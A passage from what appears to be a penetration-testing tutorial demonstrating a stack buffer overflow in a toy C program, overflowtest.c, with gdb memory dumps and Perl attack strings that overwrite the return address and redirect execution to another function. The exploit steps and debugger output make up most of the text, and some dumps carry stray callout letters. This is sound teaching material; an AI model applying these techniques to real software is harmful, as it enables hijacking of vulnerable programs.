### Analyzing the Second Breakpoint in Listing 16-10

Before we proceed to the more intriguing part, let's examine the second breakpoint in Listing 16-10.

**Breakpoint 2:**
- **Function:** `function (str=0xbffff735 'A')`
- **Location:** `overflowtest.c:10`
- **Instruction:** `strcpy(buffer, str);`

```gdb
(gdb) x/16xw $esp
0xbffff500: 0xb7f93849 0x08049ff4 0xbffff518 0x080482e8
0xbffff510: 0xb7fcfff4 0x08049ff4 0xbffff528 0x08048443u
0xbffff520: 0xbffff735 0xbffff540 0xbffff598 0xb7e8c685
0xbffff530: 0x08048470 0x08048340 0xbffff598 0xb7e8c685

(gdb) x/1xw $ebp
0xbffff518: 0xbffff528

(gdb) continue
Continuing.
```

**Listing 16-10: Examining Memory at Breakpoint 2**

At this breakpoint, you can see that the stack frame of `function1` has moved up by 32 bytes. The return address still holds the memory address `0x08048443`. Although the stack frame has shifted, the instructions to be executed remain in the same location.

To proceed to the third breakpoint, use the `continue` command.

### Analyzing the Third Breakpoint in Listing 16-11

**Breakpoint 3:**
- **Function:** `function (str=0x41414141)`
- **Location:** `overflowtest.c:11`
- **Instruction:** `}`

```gdb
(gdb) x/16xw $esp
0xbffff500: 0xbffff513 0xbffff733 0xbffff518 0x080482e8
0xbffff510: 0x41fcfff4 0x41414141 0x41414141 0x41414141
0xbffff520: 0x41414141 0x41414141 0x41414141 0x41414141
0xbffff530: 0x08040041 0x08048340 0xbffff598 0xb7e8c685

(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)
```

**Listing 16-11: Return Address Overwritten by As**

At this breakpoint, after the `strcpy` call but before `function1` returns to `main`, the return address is overwritten by `As` and part of `main`'s stack frame is also corrupted. This results in a segmentation fault when the program attempts to execute the instruction at the invalid memory address `0x41414141`.

### Controlling EIP

Our goal as exploit developers is to hijack the execution flow and get the target CPU to execute our code. To do this, we need to replace the return address with a valid memory address that the program can access. 

First, let's determine where the return address is overwritten by our long string of `As`. When we ran the program normally with only four characters for the argument, the stack looked like this:

```gdb
0xbffff520: 0xbffff533 0xbffff74c 0xbffff538 0x080482e8
0xbffff530: 0x41fcfff4 0x00414141u 0xbffff500v 0x08048443w
```

The four `As` are copied into the local variable `buffer`. The return address `0x08048443` is located immediately after the four `As`. If we provide an argument that is 5 + 4 + 4 bytes long, the last four bytes will overwrite the return address.

We can test this by sending the program an argument of nine `As` followed by four `Bs`. If the program crashes at `0x42424242`, we have calculated the offset correctly.

**Listing 16-12: Starting the Program with a New Attack String**

```gdb
(gdb) delete 1
(gdb) delete 2
(gdb) run $(perl -e 'print "A" x 9 . "B" x 4')
```

Start the program using Perl with the new attack string. Delete the first two breakpoints because the state of memory won't change significantly until the third breakpoint.

**Listing 16-13: Overwriting the Return Address with Bs**

```gdb
Breakpoint 3, function (str=0xbffff700 "\017") at overflowtest.c:11
11 }
(gdb) x/20xw $esp
0xbffff510: 0xbffff523 0xbffff744 0xbffff528 0x080482e8
0xbffff520: 0x41fcfff4 0x41414141 0x41414141 0x42424242u
0xbffff530: 0xbffff700 0xbffff550 0xbffff5a8 0xb7e8c685
0xbffff540: 0x08048470 0x08048340 0xbffff5a8 0xb7e8c685
0xbffff550: 0x00000002 0xbffff5d4 0xbffff5e0 0xb7fe2b38

(gdb) continue
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb)
```

The return address is now `0x42424242`, and the program crashes when trying to execute this invalid address.

### Hijacking Execution

We need to find a valid memory address to place in the return address. The source code of `overflowtest.c` includes another function called `overflowed` which prints "Execution Hijacked" and then returns.

**Listing 16-14: Disassembling `overflowed`**

```gdb
(gdb) disass overflowed
Dump of assembler code for function overflowed:
0x080483f4 : push %ebp
0x080483f5 : mov %esp,%ebp
0x080483f7 : sub $0x8,%esp
0x080483fa : movl $0x8048520,(%esp)
0x08048401 : call 0x804832c 
0x08048406 : leave
0x08048407 : ret
End of assembler dump.
(gdb)
```

The first instruction of `overflowed` is at `0x080483f4`. We can redirect the program to this address.

**Listing 16-15: The Return Address Bytes are Flipped**

```gdb
(gdb) run $(perl -e 'print "A" x 9 . "\x08\x04\x83\xf4"')
Starting program: /home/georgia/overflowtest $(perl -e 'print "A" x 9 . "\x08\x04\x83\xf4"')

Breakpoint 3, function (str=0xbffff700 "\017") at overflowtest.c:11
11 }
(gdb) x/16xw $esp
0xbffff510: 0xbffff523 0xbffff744 0xbffff528 0x080482e8
0xbffff520: 0x41fcfff4 0x41414141 0x41414141 0xf4830408u
0xbffff530: 0xbffff700 0xbffff550 0xbffff5a8 0xb7e8c685
0xbffff540: 0x08048470 0x08048340 0xbffff5a8 0xb7e8c685

(gdb) continue
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0xf4830408 in ?? ()
(gdb)
```

The return address is `0xf4830408` instead of `0x080483f4` due to endianness. Intel architecture is little-endian, so we need to flip the bytes.

**Listing 16-16: Successfully Hijacking Execution**

```gdb
(gdb) run $(perl -e 'print "A" x 9 . "\xf4\x83\x04\x08"')
Starting program: /home/georgia/overflowtest $(perl -e 'print "A" x 9 . "\xf4\x83\x04\x08"')

Breakpoint 3, function (str=0xbffff700 "\017") at overflowtest.c:11
11 }
(gdb) x/16xw $esp
0xbffff510: 0xbffff523 0xbffff744 0xbffff528 0x080482e8
0xbffff520: 0x41fcfff4 0x41414141 0x41414141 0x080483f4
0xbffff530: 0xbffff700 0xbffff550 0xbffff5a8 0xb7e8c685
0xbffff540: 0x08048470 0x08048340 0xbffff5a8 0xb7e8c685

(gdb) continue
Continuing.
Execution Hijacked
Program received signal SIGSEGV, Segmentation fault.
0xbffff700 in ?? ()
(gdb)
```

The program successfully prints "Execution Hijacked" and then crashes.

### Summary

In this chapter, we explored a simple C program with a buffer overflow vulnerability due to the use of the insecure `strcpy` function. We exploited this by writing a longer string than expected, overwriting the function's return address, and redirecting execution to another function within the program. In the next chapter, we will look at a more complex example involving a Windows-based FTP server.